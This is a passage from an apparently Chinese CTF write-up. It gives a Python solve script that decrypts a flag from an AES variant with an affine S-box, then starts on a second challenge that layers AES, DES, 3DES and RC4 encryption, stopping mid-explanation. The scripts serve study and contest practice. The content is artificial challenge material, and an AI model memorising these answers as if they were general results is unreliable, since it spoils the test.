class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> zip_longest</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> m: m + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(m) % <span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(m) % <span class="number">16</span>))</span><br><span class="line">xor = <span class="keyword">lambda</span> a, b: <span class="built_in">bytes</span>(aa ^ bb <span class="keyword">for</span> aa, bb <span class="keyword">in</span> zip_longest(a, b))</span><br><span class="line"></span><br><span class="line">stupid_box = [</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x60</span>, <span class="number">0x70</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x81</span>, <span class="number">0x91</span>, <span class="number">0xe1</span>, <span class="number">0xf1</span>, <span class="number">0xc1</span>, <span class="number">0xd1</span>, <span class="number">0xa1</span>, <span class="number">0xb1</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x13</span>, <span class="number">0x63</span>, <span class="number">0x73</span>, <span class="number">0x43</span>, <span class="number">0x53</span>, <span class="number">0x23</span>, <span class="number">0x33</span>, <span class="number">0x82</span>, <span class="number">0x92</span>, <span class="number">0xe2</span>, <span class="number">0xf2</span>, <span class="number">0xc2</span>, <span class="number">0xd2</span>, <span class="number">0xa2</span>, <span class="number">0xb2</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x17</span>, <span class="number">0x67</span>, <span class="number">0x77</span>, <span class="number">0x47</span>, <span class="number">0x57</span>, <span class="number">0x27</span>, <span class="number">0x37</span>, <span class="number">0x86</span>, <span class="number">0x96</span>, <span class="number">0xe6</span>, <span class="number">0xf6</span>, <span class="number">0xc6</span>, <span class="number">0xd6</span>, <span class="number">0xa6</span>, <span class="number">0xb6</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x14</span>, <span class="number">0x64</span>, <span class="number">0x74</span>, <span class="number">0x44</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x85</span>, <span class="number">0x95</span>, <span class="number">0xe5</span>, <span class="number">0xf5</span>, <span class="number">0xc5</span>, <span class="number">0xd5</span>, <span class="number">0xa5</span>, <span class="number">0xb5</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x16</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x46</span>, <span class="number">0x56</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x87</span>, <span class="number">0x97</span>, <span class="number">0xe7</span>, <span class="number">0xf7</span>, <span class="number">0xc7</span>, <span class="number">0xd7</span>, <span class="number">0xa7</span>, <span class="number">0xb7</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x15</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x45</span>, <span class="number">0x55</span>, <span class="number">0x25</span>, <span class="number">0x35</span>, <span class="number">0x84</span>, <span class="number">0x94</span>, <span class="number">0xe4</span>, <span class="number">0xf4</span>, <span class="number">0xc4</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0xb4</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x61</span>, <span class="number">0x71</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x21</span>, <span class="number">0x31</span>, <span class="number">0x80</span>, <span class="number">0x90</span>, <span class="number">0xe0</span>, <span class="number">0xf0</span>, <span class="number">0xc0</span>, <span class="number">0xd0</span>, <span class="number">0xa0</span>, <span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x12</span>, <span class="number">0x62</span>, <span class="number">0x72</span>, <span class="number">0x42</span>, <span class="number">0x52</span>, <span class="number">0x22</span>, <span class="number">0x32</span>, <span class="number">0x83</span>, <span class="number">0x93</span>, <span class="number">0xe3</span>, <span class="number">0xf3</span>, <span class="number">0xc3</span>, <span class="number">0xd3</span>, <span class="number">0xa3</span>, <span class="number">0xb3</span>,</span><br><span class="line">    <span class="number">0x0c</span>, <span class="number">0x1c</span>, <span class="number">0x6c</span>, <span class="number">0x7c</span>, <span class="number">0x4c</span>, <span class="number">0x5c</span>, <span class="number">0x2c</span>, <span class="number">0x3c</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0xed</span>, <span class="number">0xfd</span>, <span class="number">0xcd</span>, <span class="number">0xdd</span>, <span class="number">0xad</span>, <span class="number">0xbd</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x1f</span>, <span class="number">0x6f</span>, <span class="number">0x7f</span>, <span class="number">0x4f</span>, <span class="number">0x5f</span>, <span class="number">0x2f</span>, <span class="number">0x3f</span>, <span class="number">0x8e</span>, <span class="number">0x9e</span>, <span class="number">0xee</span>, <span class="number">0xfe</span>, <span class="number">0xce</span>, <span class="number">0xde</span>, <span class="number">0xae</span>, <span class="number">0xbe</span>,</span><br><span class="line">    <span class="number">0x0b</span>, <span class="number">0x1b</span>, <span class="number">0x6b</span>, <span class="number">0x7b</span>, <span class="number">0x4b</span>, <span class="number">0x5b</span>, <span class="number">0x2b</span>, <span class="number">0x3b</span>, <span class="number">0x8a</span>, <span class="number">0x9a</span>, <span class="number">0xea</span>, <span class="number">0xfa</span>, <span class="number">0xca</span>, <span class="number">0xda</span>, <span class="number">0xaa</span>, <span class="number">0xba</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x78</span>, <span class="number">0x48</span>, <span class="number">0x58</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x89</span>, <span class="number">0x99</span>, <span class="number">0xe9</span>, <span class="number">0xf9</span>, <span class="number">0xc9</span>, <span class="number">0xd9</span>, <span class="number">0xa9</span>, <span class="number">0xb9</span>,</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0x1a</span>, <span class="number">0x6a</span>, <span class="number">0x7a</span>, <span class="number">0x4a</span>, <span class="number">0x5a</span>, <span class="number">0x2a</span>, <span class="number">0x3a</span>, <span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xeb</span>, <span class="number">0xfb</span>, <span class="number">0xcb</span>, <span class="number">0xdb</span>, <span class="number">0xab</span>, <span class="number">0xbb</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x19</span>, <span class="number">0x69</span>, <span class="number">0x79</span>, <span class="number">0x49</span>, <span class="number">0x59</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x88</span>, <span class="number">0x98</span>, <span class="number">0xe8</span>, <span class="number">0xf8</span>, <span class="number">0xc8</span>, <span class="number">0xd8</span>, <span class="number">0xa8</span>, <span class="number">0xb8</span>,</span><br><span class="line">    <span class="number">0x0d</span>, <span class="number">0x1d</span>, <span class="number">0x6d</span>, <span class="number">0x7d</span>, <span class="number">0x4d</span>, <span class="number">0x5d</span>, <span class="number">0x2d</span>, <span class="number">0x3d</span>, <span class="number">0x8c</span>, <span class="number">0x9c</span>, <span class="number">0xec</span>, <span class="number">0xfc</span>, <span class="number">0xcc</span>, <span class="number">0xdc</span>, <span class="number">0xac</span>, <span class="number">0xbc</span>,</span><br><span class="line">    <span class="number">0x0e</span>, <span class="number">0x1e</span>, <span class="number">0x6e</span>, <span class="number">0x7e</span>, <span class="number">0x4e</span>, <span class="number">0x5e</span>, <span class="number">0x2e</span>, <span class="number">0x3e</span>, <span class="number">0x8f</span>, <span class="number">0x9f</span>, <span class="number">0xef</span>, <span class="number">0xff</span>, <span class="number">0xcf</span>, <span class="number">0xdf</span>, <span class="number">0xaf</span>, <span class="number">0xbf</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建逆 S 盒</span></span><br><span class="line">inv_stupid_box = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(stupid_box):</span><br><span class="line">    inv_stupid_box[val] = idx</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_rows</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        m[<span class="number">0x0</span>], m[<span class="number">0x5</span>], m[<span class="number">0xa</span>], m[<span class="number">0xf</span>],</span><br><span class="line">        m[<span class="number">0x4</span>], m[<span class="number">0x9</span>], m[<span class="number">0xe</span>], m[<span class="number">0x3</span>],</span><br><span class="line">        m[<span class="number">0x8</span>], m[<span class="number">0xd</span>], m[<span class="number">0x2</span>], m[<span class="number">0x7</span>],</span><br><span class="line">        m[<span class="number">0xc</span>], m[<span class="number">0x1</span>], m[<span class="number">0x6</span>], m[<span class="number">0xb</span>]</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_shift_rows</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        m[<span class="number">0x0</span>], m[<span class="number">0xd</span>], m[<span class="number">0xa</span>], m[<span class="number">0x7</span>],</span><br><span class="line">        m[<span class="number">0x4</span>], m[<span class="number">0x1</span>], m[<span class="number">0xe</span>], m[<span class="number">0xb</span>],</span><br><span class="line">        m[<span class="number">0x8</span>], m[<span class="number">0x5</span>], m[<span class="number">0x2</span>], m[<span class="number">0xf</span>],</span><br><span class="line">        m[<span class="number">0xc</span>], m[<span class="number">0x9</span>], m[<span class="number">0x6</span>], m[<span class="number">0x3</span>]</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_bytes</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(stupid_box[mm] <span class="keyword">for</span> mm <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_sub_bytes</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(inv_stupid_box[mm] <span class="keyword">for</span> mm <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_columns</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gf_mul</span>(<span class="params">a, b</span>):</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        d = a</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">reversed</span>(<span class="built_in">bin</span>(b)[<span class="number">2</span>:])):</span><br><span class="line">            <span class="keyword">if</span> bit:</span><br><span class="line">                c ^= d</span><br><span class="line">            d = d &lt;&lt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> d &amp; <span class="number">0x100</span>:</span><br><span class="line">                d ^= <span class="number">0x11b</span></span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_mix_column</span>(<span class="params">col</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">1</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">1</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">3</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">2</span>)</span><br><span class="line">        ])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        *_mix_column(m[:<span class="number">4</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">4</span>:<span class="number">8</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">8</span>:<span class="number">12</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mix_columns</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gf_mul</span>(<span class="params">a, b</span>):</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        d = a</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">reversed</span>(<span class="built_in">bin</span>(b)[<span class="number">2</span>:])):</span><br><span class="line">            <span class="keyword">if</span> bit:</span><br><span class="line">                c ^= d</span><br><span class="line">            d = d &lt;&lt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> d &amp; <span class="number">0x100</span>:</span><br><span class="line">                d ^= <span class="number">0x11b</span></span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_inv_mix_column</span>(<span class="params">col</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">14</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">11</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">13</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">9</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">9</span>)  ^ _gf_mul(col[<span class="number">1</span>], <span class="number">14</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">11</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">13</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">13</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">9</span>)  ^ _gf_mul(col[<span class="number">2</span>], <span class="number">14</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">11</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">11</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">13</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">9</span>)  ^ _gf_mul(col[<span class="number">3</span>], <span class="number">14</span>)</span><br><span class="line">        ])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        *_inv_mix_column(m[:<span class="number">4</span>]),</span><br><span class="line">        *_inv_mix_column(m[<span class="number">4</span>:<span class="number">8</span>]),</span><br><span class="line">        *_inv_mix_column(m[<span class="number">8</span>:<span class="number">12</span>]),</span><br><span class="line">        *_inv_mix_column(m[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">m, k</span>):</span><br><span class="line">    <span class="keyword">return</span> xor(m, k)</span><br><span class="line"></span><br><span class="line">RCON = [<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_schedule</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(k) == <span class="number">16</span></span><br><span class="line">    sub_keys = [k]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        sub_key = <span class="built_in">bytes</span>(</span><br><span class="line">            stupid_box[w1] ^ w2 ^ rr</span><br><span class="line">                <span class="keyword">for</span> w1, w2, rr <span class="keyword">in</span> <span class="built_in">zip</span>(</span><br><span class="line">                    sub_keys[-<span class="number">1</span>][<span class="number">13</span>:] + sub_keys[-<span class="number">1</span>][<span class="number">12</span>:<span class="number">13</span>],</span><br><span class="line">                    sub_keys[-<span class="number">1</span>][:<span class="number">4</span>],</span><br><span class="line">                    (RCON[i], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">                )</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            sub_key += xor(sub_keys[-<span class="number">1</span>][<span class="number">4</span>*j+<span class="number">4</span>:<span class="number">4</span>*j+<span class="number">8</span>], sub_key[<span class="number">4</span>*j:<span class="number">4</span>*j+<span class="number">4</span>])</span><br><span class="line">        sub_keys.append(sub_key)</span><br><span class="line">    <span class="keyword">return</span> sub_keys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, k</span>):</span><br><span class="line">    sub_keys = key_schedule(k)</span><br><span class="line">    m = add_round_key(m, sub_keys[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        m = sub_bytes(m)</span><br><span class="line">        m = shift_rows(m)</span><br><span class="line">        m = mix_columns(m)</span><br><span class="line">        m = add_round_key(m, sub_keys[i+<span class="number">1</span>])</span><br><span class="line">    m = sub_bytes(m)</span><br><span class="line">    m = shift_rows(m)</span><br><span class="line">    m = add_round_key(m, sub_keys[<span class="number">10</span>])</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, k</span>):</span><br><span class="line">    sub_keys = key_schedule(k)</span><br><span class="line">    <span class="comment"># 逆初始轮密钥加</span></span><br><span class="line">    c = add_round_key(c, sub_keys[<span class="number">10</span>])</span><br><span class="line">    c = inv_shift_rows(c)</span><br><span class="line">    c = inv_sub_bytes(c)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        c = add_round_key(c, sub_keys[i])</span><br><span class="line">        c = inv_mix_columns(c)</span><br><span class="line">        c = inv_shift_rows(c)</span><br><span class="line">        c = inv_sub_bytes(c)</span><br><span class="line">    c = add_round_key(c, sub_keys[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_ecb</span>(<span class="params">m, k</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(m) % <span class="number">16</span> == <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(k) == <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(encrypt(m[i:i+<span class="number">16</span>], k) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知密文</span></span><br><span class="line">ct = <span class="string">b&#x27;&amp;\xa4\xe7&#123;\x94\x10cC\xf0\x8c\xaa&lt;\x1e-_\xa4\x12H\x8e;\xa2W\xd4\x85\x81\xb9\xc1\xb6\xd0ovyQ\xd5B#f-\x00\xd7\x8a\xc7\xfcs&quot;9M6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用全 0 密钥</span></span><br><span class="line">k0 = <span class="built_in">bytes</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算全 0 明文加密结果（即 encrypt(0, k0)）</span></span><br><span class="line">encrypt_0 = encrypt(<span class="built_in">bytes</span>(<span class="number">16</span>), k0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后一个明文块（全 0x10）</span></span><br><span class="line">m_n = <span class="built_in">bytes</span>([<span class="number">0x10</span>] * <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 加密 m_n 得到 encrypt(m_n, k0)</span></span><br><span class="line">encrypt_m_n = encrypt(m_n, k0)</span><br><span class="line"><span class="comment"># 计算 L(m_n) = encrypt(m_n, k0) XOR encrypt_0</span></span><br><span class="line">L_mn = xor(encrypt_m_n, encrypt_0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割密文块</span></span><br><span class="line">ct_blocks = [ct[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ct), <span class="number">16</span>)]</span><br><span class="line">ct_n = ct_blocks[-<span class="number">1</span>]  <span class="comment"># 最后一个密文块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算常数 C(k) = ct_n XOR L_mn</span></span><br><span class="line">C_k = xor(ct_n, L_mn)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对每个密文块解密</span></span><br><span class="line">plain_blocks = []</span><br><span class="line"><span class="keyword">for</span> ct_i <span class="keyword">in</span> ct_blocks:</span><br><span class="line">    tmp = xor(xor(ct_i, C_k), encrypt_0)</span><br><span class="line">    m_i = decrypt(tmp, k0)</span><br><span class="line">    plain_blocks.append(m_i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并明文块</span></span><br><span class="line">plain = <span class="string">b&#x27;&#x27;</span>.join(plain_blocks)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><blockquote><p>拓展:所谓&quot;线性&quot;是什么东西?<br>答案:满足$$f(x,\mathrm{xor}, y)=f(x),\mathrm{xor} ,f(y)\mathrm{xor} ,c$$其中c是一个常数,我们称这个盒子是线性的.<br>这会导致所有轮密钥每轮加密可以被视作只有一个密钥加密,这个时候解密脚本呼之欲出,交给ds了…</p></blockquote><h2 id="神秘题">神秘题</h2><h3 id="task1-2">task1</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4, DES, DES3, AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">32</span></span><br><span class="line">functions = [</span><br><span class="line">    <span class="keyword">lambda</span> data: AES.new(<span class="string">b&#x27;DEADBEEFcafebabe&#x27;</span>, AES.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: AES.new(<span class="string">b&#x27;deadc0de!@#$%^&amp;*&#x27;</span>, AES.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: DES.new(<span class="string">b&#x27;deadbeef&#x27;</span>, DES.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: DES.new(<span class="string">b&#x27;13572468&#x27;</span>, DES.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: DES3.new(<span class="string">b&#x27;13572468abcdefgh1!2@3#4$&#x27;</span>, DES3.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: DES3.new(<span class="string">b&#x27;qazwsxedcrfvtgbyhnujmik,&#x27;</span>, DES3.MODE_ECB).encrypt(pad(data, <span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: ARC4.new(<span class="string">b&#x27;never gonna give you up&#x27;</span>).encrypt(data + os.urandom(<span class="number">16</span>)),</span><br><span class="line">    <span class="keyword">lambda</span> data: ARC4.new(<span class="string">b&#x27;never gonna let you down&#x27;</span>).encrypt(data + os.urandom(<span class="number">16</span>))</span><br><span class="line">]</span><br><span class="line">ct = pad(flag, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">for</span> function <span class="keyword">in</span> random.sample(functions, <span class="number">3</span>):</span><br><span class="line">        ct = function(ct)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ct = bytes.fromhex(&#x27;<span class="subst">&#123;ct.<span class="built_in">hex</span>()&#125;</span>&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到,上述加密方式&quot;随机&quot;选了5000组加密方式,且每组从上述8个方式里面选3个不重的进行加密.<br>尝试构造解密脚本,大方向是dfs.想想怎么剪枝:<br><strong>pad(s,16)</strong> 这实际上是给一个固定尾巴的函数,如果s本身就是16的倍数,就会在末尾补上16个 <code>/x10</code> 